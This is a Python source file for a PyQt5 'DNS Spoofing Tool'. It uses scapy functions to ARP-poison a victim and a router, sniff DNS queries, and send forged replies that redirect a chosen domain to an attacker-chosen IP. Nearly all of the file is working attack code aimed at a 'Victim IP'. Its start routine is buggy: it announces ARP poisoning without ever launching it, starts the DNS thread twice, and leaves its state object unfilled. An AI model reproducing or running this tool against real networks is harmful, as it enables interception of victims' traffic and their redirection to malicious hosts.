
import sys
import os
import time
import signal
import threading
from scapy.all import ARP, Ether, IP, UDP, DNS, DNSRR, srp, send, sniff
from scapy.layers.dns import DNSQR
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QLineEdit, QVBoxLayout, QWidget, QPushButton, QTextEdit
from PyQt5.QtCore import QObject, pyqtSignal
from PyQt5.QtCore import QRegExp
from PyQt5.QtGui import QRegExpValidator
from PyQt5.QtCore import Qt

# SpoofState class for maintaining the spoofing state
class SpoofState:
    def __init__(self):
        self.poison_thread = None
        self.dns_spoof_thread = None
        self.router_ip = None
        self.victim_ip = None
        self.router_mac = None
        self.victim_mac = None
        self.spoofing_started = False
        self.stop_sniffing = False

spoof_state = SpoofState()

# OutputWrapper class for redirecting stdout and stderr
class OutputWrapper(QObject):
    output_written = pyqtSignal(str)

    def write(self, text):
        self.output_written.emit(str(text))

    def flush(self):
        pass

    def isatty(self):
        return False

stop_sniffing = False

# Function to get the MAC address of a given IP    
def originalMAC(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r[Ether].src

# Function to poison the ARP cache
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

# Function to restore the original MAC addresses
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
     
# Function to perform DNS spoofing
def dns_spoof(pkt, domain, redirect_to):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode('utf-8')
        if domain in qname:
            spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                           an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_to))
            send(spf_resp, verbose=0)
            print('[+] Sent spoofed packet for %s' % qname)

# Function to start the ARP poisoning
def sniff_dns_packets(domain, redirect_to):
    sniff(filter="udp and port 53", prn=lambda pkt: dns_spoof(pkt, domain, redirect_to), store=0, stop_filter=lambda x: stop_sniffing)

# MainWindow class for the GUI
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        
        self.setMinimumSize(600, 400)  
        font = self.font()
        font.setPointSize(12) 
        self.setFont(font)
        self.setWindowTitle("DNS Spoofing Tool")
        
        # Set up input fields and buttons
        self.domain_input = QLineEdit(self)
        self.router_ip_input = QLineEdit(self)
        self.victim_ip_input = QLineEdit(self)
        self.redirect_to_input = QLineEdit(self)
        self.start_button = QPushButton("Start", self)
        self.stop_button = QPushButton("Stop", self)

        self.domain_input.setMinimumWidth(300)  
        self.router_ip_input.setMinimumWidth(300)
        self.victim_ip_input.setMinimumWidth(300)
        self.redirect_to_input.setMinimumWidth(300)

        self.start_button.setMinimumWidth(100)  
        self.stop_button.setMinimumWidth(100)
       
        # Set placeholder text for input fields
        self.domain_input.setPlaceholderText("e.g. example.com")
        self.router_ip_input.setPlaceholderText("e.g. 192.168.1.254")
        self.victim_ip_input.setPlaceholderText("e.g. 192.168.1.100")
        self.redirect_to_input.setPlaceholderText("e.g. 192.168.1.2")
    
        # Set IP input validation
        ip_regex = QRegExp("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(:[0-9]{1,5})?$")
        ip_validator = QRegExpValidator(ip_regex)
         
        self.router_ip_input.setValidator(ip_validator)
        self.victim_ip_input.setValidator(ip_validator)
        self.redirect_to_input.setValidator(ip_validator)

        layout = QVBoxLayout()

        # Add input fields and labels to the layout
        layout.addWidget(QLabel("Domain to spoof", self))
        layout.addWidget(self.domain_input)
        layout.addWidget(QLabel("Router IP", self))
        layout.addWidget(self.router_ip_input)
        layout.addWidget(QLabel("Victim IP", self))
        layout.addWidget(self.victim_ip_input)
        layout.addWidget(QLabel("Redirect to IP", self))
        layout.addWidget(self.redirect_to_input)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        
        # Set up output display
        self.output_display = QTextEdit(self)
        self.output_display.setReadOnly(True)
        layout.addWidget(QLabel("Output:", self))
        layout.addWidget(self.output_display)        
            
        central_widget = QWidget()
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

        # Connect button signals to slots
        self.start_button.clicked.connect(self.start_spoofing)
        self.stop_button.clicked.connect(self.stop_spoofing)
        
    # Enable or disable input fields
    def set_input_fields_enabled(self, enabled):
        self.domain_input.setEnabled(enabled)
        self.router_ip_input.setEnabled(enabled)
        self.victim_ip_input.setEnabled(enabled)
        self.redirect_to_input.setEnabled(enabled)
        
    # Function to start spoofing
    def start_spoofing(self):
        global spoof_state

        domain = self.domain_input.text()
        router_ip = self.router_ip_input.text()
        victim_ip = self.victim_ip_input.text()
        redirect_to = self.redirect_to_input.text()

        if not all([domain, router_ip, victim_ip, redirect_to]):
            print("[-] Please fill in all the fields")
            return
        
        try:
            router_mac = originalMAC(router_ip)
            victim_mac = originalMAC(victim_ip)

            if not all([router_mac, victim_mac]):
                print("[-] Could not find MAC addresses for the provided IPs")
                return

            dns_spoof_thread = threading.Thread(target=sniff_dns_packets, args=(domain, redirect_to))
            dns_spoof_thread.daemon = True
            dns_spoof_thread.start()

            print("[+] ARP poisoning started")

            dns_spoof_thread = threading.Thread(target=sniff_dns_packets, args=(domain, redirect_to))
            dns_spoof_thread.daemon = True
            dns_spoof_thread.start()

            self.set_input_fields_enabled(False)
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)

            spoof_state.spoofing_started = True
        except Exception as e:
            print(f"[-] Error while starting spoofing: {e}")
  
   # Function to stop spoofing         
    def stop_spoofing(self):
        global spoof_state

        if not spoof_state.spoofing_started:
            print("[-] No spoofing is running.")
            return

        spoof_state.stop_sniffing = True
        print("[-] Stopping DNS spoofing and ARP poisoning")

        # Wait for threads to finish
        if spoof_state.poison_thread is not None:
            spoof_state.poison_thread.join()

        if spoof_state.dns_spoof_thread is not None:
            spoof_state.dns_spoof_thread.join()

        print("[-] Restoring MAC addresses")
        restore(spoof_state.router_ip, spoof_state.victim_ip, spoof_state.router_mac, spoof_state.victim_mac)

        spoof_state.spoofing_started = False
        self.set_input_fields_enabled(True)
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        
if __name__ == "__main__":
    # Create the Qt Application
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    # Redirect stdout and stderr to the output display
    output_wrapper = OutputWrapper()
    output_wrapper.output_written.connect(main_window.output_display.append)
    sys.stdout = output_wrapper
    sys.stderr = output_wrapper   
    
    sys.exit(app.exec_())

